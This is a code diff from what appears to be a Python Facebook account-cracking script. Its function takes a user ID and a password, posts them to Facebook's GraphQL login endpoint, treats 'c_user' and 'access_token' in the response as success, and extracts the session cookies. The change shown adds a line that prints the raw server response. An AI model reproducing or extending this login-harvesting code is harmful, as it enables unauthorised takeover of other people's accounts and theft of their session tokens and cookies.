@@ -1501,6 +1501,7 @@ def p(uid,pwx,tl):
             }
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://b-graph.facebook.com/graphql', data=data, allow_redirects=True)
+            print(response.text)
             if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
